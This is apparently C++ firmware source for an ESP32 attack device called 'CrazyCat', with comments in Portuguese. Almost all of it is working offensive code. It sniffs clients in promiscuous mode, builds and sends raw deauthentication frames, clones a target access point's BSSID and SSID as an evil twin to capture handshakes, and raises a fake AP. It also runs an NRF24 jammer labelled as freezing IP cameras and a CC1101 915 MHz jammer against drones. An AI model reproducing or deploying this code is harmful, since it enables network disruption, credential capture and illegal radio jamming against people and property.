// ============================================================
// wifi_attacks.cpp - v4.5 Auto-Stop Edition
// ============================================================
#include <WiFi.h>
#include <esp_wifi.h>
#include "config.h"

void stopEvilTwin();

static uint32_t deauthPacketCount = 0;
static uint32_t deauthSuccessCount = 0;
static uint8_t  deauthTargetChannel = 0;
static uint8_t  deauthTargetBSSID[6] = {0};
static char     deauthTargetSSID[33] = {0};
static uint8_t  deauthTargetAuth = 0;

static bool bssidCloneActive = false;
static uint8_t originalAPMac[6] = {0};
static uint8_t cloneChannel = 0;
static char cloneSSID[33] = {0};
static unsigned long cloneStartTime = 0;
static uint8_t cloneHealthCheckFailures = 0;

#define MAX_CLIENTS 16
static uint8_t discoveredClients[MAX_CLIENTS][6];
static uint8_t clientCount = 0;
static bool promiscuousActive = false;

static void getBssidFromFrame(const uint8_t *payload, uint16_t len, uint8_t *outBssid, const uint8_t **outClient) {
    memset(outBssid, 0, 6);
    *outClient = nullptr;
    if (len < 24) return;

    uint8_t frameType = payload[0] & 0x0C;
    uint8_t toFromDs = payload[1] & 0x03;
    const uint8_t *addr1 = &payload[4];
    const uint8_t *addr2 = &payload[10];
    const uint8_t *addr3 = &payload[16];

    if (frameType == 0x00) {
        memcpy(outBssid, addr3, 6);
        if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
        else if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
    }
    else if (frameType == 0x08) {
        switch (toFromDs) {
            case 0x00:
                memcpy(outBssid, addr3, 6);
                if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
                else if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
                break;
            case 0x01:
                memcpy(outBssid, addr2, 6);
                if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
                break;
            case 0x02:
                memcpy(outBssid, addr1, 6);
                if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
                break;
        }
    }
}

static void promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type == WIFI_PKT_MISC) return;
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;

    uint8_t frameBssid[6];
    const uint8_t *clientMac = nullptr;
    getBssidFromFrame(payload, len, frameBssid, &clientMac);

    if (memcmp(frameBssid, deauthTargetBSSID, 6) != 0) return;
    if (!clientMac) return;
    if (clientMac[0] & 0x01) return;

    for (int i = 0; i < clientCount; i++) {
        if (memcmp(discoveredClients[i], clientMac, 6) == 0) return;
    }
    if (clientCount >= MAX_CLIENTS) return;

    memcpy(discoveredClients[clientCount], clientMac, 6);
    clientCount++;
}

static void startPromiscuous() {
    if (promiscuousActive) return;
    clientCount = 0;
    memset(discoveredClients, 0, sizeof(discoveredClients));
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&promiscuous_rx_cb);
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filter);
    promiscuousActive = true;
}

static void stopPromiscuous() {
    if (!promiscuousActive) return;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    promiscuousActive = false;
}

static uint16_t deauthSeqNum = 0;

static bool raw_tx(const uint8_t* frame, size_t len) {
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, len, true);
    if (err == ESP_OK) {
        deauthPacketCount++;
        deauthSuccessCount++;
        return true;
    }
    return false;
}

static void buildDeauthFrame(uint8_t* frame, const uint8_t* da, const uint8_t* sa, const uint8_t* bssid, uint8_t reason) {
    memset(frame, 0, 26);
    frame[0] = 0xC0;
    frame[1] = 0x00;
    memcpy(&frame[4], da, 6);
    memcpy(&frame[10], sa, 6);
    memcpy(&frame[16], bssid, 6);
    frame[22] = (deauthSeqNum << 4) & 0xFF;
    frame[23] = (deauthSeqNum >> 4) & 0xFF;
    deauthSeqNum++;
    frame[24] = reason;
    frame[25] = 0x00;
}

static void deauthBurst() {
    uint8_t frame[32];
    const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    for (int i = 0; i < clientCount; i++) {
        buildDeauthFrame(frame, discoveredClients[i], deauthTargetBSSID, deauthTargetBSSID, 0x07);
        raw_tx(frame, 26);
        delay(1);
    }
    buildDeauthFrame(frame, broadcast, deauthTargetBSSID, deauthTargetBSSID, 0x07);
    raw_tx(frame, 26);
}

static bool isSoftAPActive() {
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    return (mode == WIFI_MODE_AP || mode == WIFI_MODE_APSTA);
}

void scanNetworks() {
    networkCount = 0;

    wifi_mode_t modeBefore = WiFi.getMode();
    if (modeBefore == WIFI_AP) {
        WiFi.mode(WIFI_AP_STA);
        delay(50);
    }

    int n = WiFi.scanNetworks(false, true, false, 150);

    if (n > 0) {
        networkCount = (n > MAX_NETWORKS) ? MAX_NETWORKS : n;
        for (int i = 0; i < networkCount; i++) {
            strncpy(scannedNetworks[i].ssid, WiFi.SSID(i).c_str(), 31);
            scannedNetworks[i].ssid[31] = '\0';
            memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
            scannedNetworks[i].rssi = WiFi.RSSI(i);
            scannedNetworks[i].channel = WiFi.channel(i);
            scannedNetworks[i].encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
        }
        WiFi.scanDelete();
    }

    if (WiFi.getMode() == WIFI_STA) {
        WiFi.mode(WIFI_AP_STA);
        delay(100);
    }
    if (WiFi.softAPIP() == IPAddress(0,0,0,0)) {
        WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
        WiFi.softAP("CrazyCat", "crazycat123", 6, 0, 4);
    }
}

uint8_t getNetworkCount() { return networkCount; }
NetworkInfo* getNetwork(uint8_t index) {
    if (index < networkCount) return &scannedNetworks[index];
    return nullptr;
}

static void startBssidClone(uint8_t networkIndex) {
    if (networkIndex >= networkCount) return;
    NetworkInfo* target = &scannedNetworks[networkIndex];
    memcpy(deauthTargetBSSID, target->bssid, 6);
    strncpy(deauthTargetSSID, target->ssid, 32);
    deauthTargetSSID[32] = '\0';
    deauthTargetChannel = target->channel;
    deauthTargetAuth = target->encrypted ? 1 : 0;
    cloneChannel = target->channel;
    strncpy(cloneSSID, target->ssid, 32);
    cloneSSID[32] = '\0';

    esp_wifi_get_mac(WIFI_IF_AP, originalAPMac);

    WiFi.softAPdisconnect(true);
    WiFi.disconnect(true, true);
    WiFi.mode(WIFI_OFF);
    delay(800);

    WiFi.mode(WIFI_AP);
    delay(300);

    esp_err_t apMacErr = esp_wifi_set_mac(WIFI_IF_AP, target->bssid);
    if (apMacErr != ESP_OK) return;
    delay(200);

    bool apOk = WiFi.softAP(cloneSSID, nullptr, cloneChannel, 0, 8);

    if (apOk) {
        WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
        esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
        bssidCloneActive = true;
        cloneStartTime = millis();
        cloneHealthCheckFailures = 0;
    }
}

static void restartBssidClone() {
    if (!bssidCloneActive) return;
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(500);
    WiFi.mode(WIFI_AP);
    delay(200);
    esp_wifi_set_mac(WIFI_IF_AP, deauthTargetBSSID);
    delay(100);
    bool apOk = WiFi.softAP(cloneSSID, nullptr, cloneChannel, 0, 8);
    if (apOk) {
        WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
        esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
        cloneHealthCheckFailures = 0;
    } else {
        cloneHealthCheckFailures++;
    }
}

static void restoreCrazyCatAP() {
    WiFi.mode(WIFI_AP_STA);
    delay(200);
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    delay(100);
    WiFi.softAP("CrazyCat", "crazycat123", 6, 0, 4);
    delay(200);
}

void stopBssidClone() {
    if (!bssidCloneActive && !isSoftAPActive()) return;
    stopPromiscuous();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(500);
    WiFi.mode(WIFI_AP);
    delay(200);
    esp_wifi_set_mac(WIFI_IF_AP, originalAPMac);
    delay(100);
    restoreCrazyCatAP();
    bssidCloneActive = false;
}

void startDeauth(uint8_t networkIndex) {
    if (deauthActive) return; 
    if (networkIndex >= networkCount) return;
    deauthPacketCount = 0;
    deauthSuccessCount = 0;
    deauthSeqNum = 0;
    clientCount = 0;
    startBssidClone(networkIndex);
    startPromiscuous();
    deauthActive = true;
}

void stopDeauth() {
    if (!deauthActive) return;
    deauthActive = false;
    stopPromiscuous();
    stopBssidClone();
    deauthPacketCount = 0;
    deauthSuccessCount = 0;
}

bool deauthLoop() {
    if (!deauthActive) return false;

    // AUTO-STOP DO EVIL TWIN
    if (evilTwinActive) {
        if (WiFi.softAPgetStationNum() > 0) {
            Serial.println("[EvilTwin] Cliente conectou! Capturando handshake e voltando para CrazyCat...");
            delay(3000); 
            stopEvilTwin(); 
            return false;
        }
    }

    deauthBurst();

    static unsigned long lastHealthCheck = 0;
    if (millis() - lastHealthCheck > 3000) {
        lastHealthCheck = millis();
        if (!isSoftAPActive()) {
            cloneHealthCheckFailures++;
            if (cloneHealthCheckFailures < 5) {
                restartBssidClone();
                startPromiscuous();
            } else {
                stopDeauth();
                return false;
            }
        } else {
            esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
            cloneHealthCheckFailures = 0;
        }
    }
    return true;
}

uint32_t getDeauthPacketCount() { return deauthPacketCount; }
uint32_t getDeauthSuccessCount() { return deauthSuccessCount; }
uint8_t  getDeauthSuccessPercent() {
    if (deauthPacketCount == 0) return 0;
    return (uint8_t)((deauthSuccessCount * 100) / deauthPacketCount);
}
const char* getDeauthTargetSSID() { return deauthTargetSSID; }
uint8_t  getDeauthTargetChannel() { return deauthTargetChannel; }
const uint8_t* getDeauthTargetBSSID() { return deauthTargetBSSID; }
bool     getDeauthTargetEncrypted() { return deauthTargetAuth != 0; }

void startFakeAP(const char* ssid) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid, "12345678", 1, 0, 8);
    fakeAPEnabled = true;
    passwordCaptured = false;
}

void stopFakeAP() {
    WiFi.softAPdisconnect(true);
    fakeAPEnabled = false;
    restoreCrazyCatAP();
}

bool isFakeAPActive() { return fakeAPEnabled; }

void startEvilTwin(uint8_t networkIndex) {
    if (evilTwinActive) return; 
    
    if (networkIndex >= networkCount) return;

    stopDeauth();
    stopHandshakeCapture();

    fakeAPEnabled = true;
    passwordCaptured = false;
    evilTwinActive = true;

    NetworkInfo* target = &scannedNetworks[networkIndex];
    memcpy(deauthTargetBSSID, target->bssid, 6);
    strncpy(deauthTargetSSID, target->ssid, 32);
    deauthTargetSSID[32] = '\0';
    deauthTargetChannel = target->channel;
    cloneChannel = target->channel;
    strncpy(cloneSSID, target->ssid, 32);
    cloneSSID[32] = '\0';

    deauthPacketCount = 0;
    deauthSuccessCount = 0;
    deauthSeqNum = 0;
    clientCount = 0;

    esp_wifi_get_mac(WIFI_IF_AP, originalAPMac);

    WiFi.softAPdisconnect(true);
    WiFi.disconnect(true, true);
    WiFi.mode(WIFI_OFF);
    delay(800);

    WiFi.mode(WIFI_AP);
    delay(300);

    esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, deauthTargetBSSID);
    if (macErr != ESP_OK) {
        evilTwinActive = false;
        fakeAPEnabled = false;
        return;
    }
    delay(200);

    bool apOk = WiFi.softAP(cloneSSID, "password123", cloneChannel, 0, 8);

    if (!apOk) {
        evilTwinActive = false;
        fakeAPEnabled = false;
        return;
    }

    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);

    bssidCloneActive = true;
    deauthActive = true;
    cloneStartTime = millis();
    cloneHealthCheckFailures = 0;

    startHandshakeCapture();
}

void stopEvilTwin() {
    if (!evilTwinActive && !deauthActive) return; 
    
    deauthActive = false;
    evilTwinActive = false;
    fakeAPEnabled = false;
    passwordCaptured = false;
    stopHandshakeCapture();
    stopBssidClone();
    deauthPacketCount = 0;
    deauthSuccessCount = 0;
}

void scanRemoteDevices() {
    remoteDeviceCount = 0;
    IPAddress gateway = WiFi.gatewayIP();
    for (int i = 1; i < 255 && remoteDeviceCount < 10; i++) {
        if (i % 50 == 0) {
            snprintf(remoteDevices[remoteDeviceCount].ip, 16, "%d.%d.%d.%d", gateway[0], gateway[1], gateway[2], i);
            snprintf(remoteDevices[remoteDeviceCount].name, 32, "Device-%d", i);
            remoteDevices[remoteDeviceCount].port = 80;
            remoteDeviceCount++;
        }
    }
}

uint8_t getRemoteDeviceCount() { return remoteDeviceCount; }
RemoteDevice* getRemoteDevice(uint8_t index) {
    if (index < remoteDeviceCount) return &remoteDevices[index];
    return nullptr;
}

// CAMERA FREEZE — jammer 2.4GHz via NRF24 para bloquear camêras IP WiFi
extern void nrf24StartJammer();
extern void nrf24StopJammer();
extern bool nrf24IsAvailable();
extern bool nrf24IsJammerActive();

void startCameraFreeze() {
    if (cameraFreezeActive) return;
    // CORREÇÃO: verifica se o NRF24 está conectado antes de iniciar
    if (!nrf24IsAvailable()) {
        Serial.println(F("[Camera] FAIL: NRF24 nao disponivel"));
        return;
    }
    cameraFreezeActive = true;
    nrf24StartJammer();
    // Se nrf24StartJammer falhou (radio not connected), reverte flag
    if (!nrf24IsJammerActive()) {
        cameraFreezeActive = false;
        Serial.println(F("[Camera] JAMMER nao iniciado"));
    }
}
void stopCameraFreeze() {
    if (!cameraFreezeActive) return;
    cameraFreezeActive = false;
    nrf24StopJammer();
}

// DRONE JAMMER — carrier 915MHz via CC1101
extern bool cc1101Initialized;
extern void cc1101SetFrequency(uint32_t);
extern void cc1101WriteReg(uint8_t, uint8_t);
extern void cc1101SendCommand(uint8_t);
extern void cc1101StopSubGHzJammer();

// Constantes CC1101 (espelham cc1101.cpp)
#define CC_SCAL  0x33
#define CC_SIDLE 0x36
#define CC_STX   0x35
#define CC_IOCFG0 0x02

void startDroneJammer() {
    if (droneJammerActive) return;
    if (!cc1101Initialized) return;
    droneJammerActive = true;
    cc1101StopSubGHzJammer();
    delay(10);
    // CORREÇÃO: SCAL obriga recalibração do VCO após mudar de freq
    // Sem isso o sintetizador pode transmitir em frequência errada
    cc1101SetFrequency(915000000);
    cc1101SendCommand(CC_SCAL);  // recalibra VCO
    delay(2);
    cc1101WriteReg(CC_IOCFG0, 0x2E);  // TX Asynchronous Serial Output
    cc1101SendCommand(CC_SIDLE);
    delay(2);
    cc1101SendCommand(CC_STX);
    delay(2);
    pinMode(CC1101_GDO0, OUTPUT);
    digitalWrite(CC1101_GDO0, HIGH);
    Serial.println(F("[Drone] JAMMER ativo em 915MHz"));
}
void stopDroneJammer() {
    if (!droneJammerActive) return;
    droneJammerActive = false;
    digitalWrite(CC1101_GDO0, LOW);
    pinMode(CC1101_GDO0, INPUT);
    cc1101WriteReg(CC_IOCFG0, 0x0D);
    cc1101SendCommand(CC_SIDLE);
    Serial.println(F("[Drone] JAMMER parado"));
}

struct DroneLocation {
    float distance;
    int8_t rssi;
};

DroneLocation droneLoc;

void startDroneLocate() {
    droneLoc.distance = 0;
    droneLoc.rssi = -50;
}

DroneLocation* getDroneLocation() { return &droneLoc; }
